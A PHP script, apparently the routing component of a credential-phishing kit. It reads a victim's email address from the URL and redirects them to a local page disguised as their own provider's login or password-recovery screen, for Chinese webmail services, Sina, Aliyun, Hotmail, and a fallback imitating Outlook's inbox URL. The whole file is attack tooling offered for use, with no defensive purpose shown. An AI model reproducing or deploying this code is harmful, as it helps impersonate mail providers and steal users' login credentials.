<?php

$email = @$_GET["email"];
function OutlawedABH($tag, $email){
$i = 0;
$x = "";

while($email[$i] != "@"){
$i = $i+1;
}
$i = $i+1;
$x = substr($email, $i);

$pos = strpos($x, $tag);
if($pos === false){
	return false;
}

else {
	return true;
}

};

if (OutlawedABH("vip.163.com", $email)){
	header("location: activity.vip.163.com?activity.yearend&index.html?from=dengluwenzi&email=$email");

}

elseif (OutlawedABH("vip.126.com", $email)){
	header("location: activity.vip.126.com?activity.yearend&index.html?from=dengluwenzi&email=$email");

}

elseif (OutlawedABH("126.com", $email)){
	header("location: mail.126.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");

}

elseif (OutlawedABH("163.com", $email)){
	header("location: mail.163.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");

}


elseif (OutlawedABH("yeah.net", $email)){
	header("location: yeah.net?errorType=401&error&email=$email");


}


elseif (OutlawedABH("263.net", $email)){
	header("location: 263.net?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");
	
	
	
}


elseif (OutlawedABH("sina.com", $email)){
	header("location: sina.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");




}


elseif (OutlawedABH("188.com", $email)){
	header("location: 188.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");



}


elseif (OutlawedABH("aliyun.com", $email)){
	header("location: aliyun.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");
	
	
	
	
}


elseif (OutlawedABH("hotmail.com", $email)){
	header("location: hotmail.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");
	



}

else {
	header("location: domain?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");

}

?>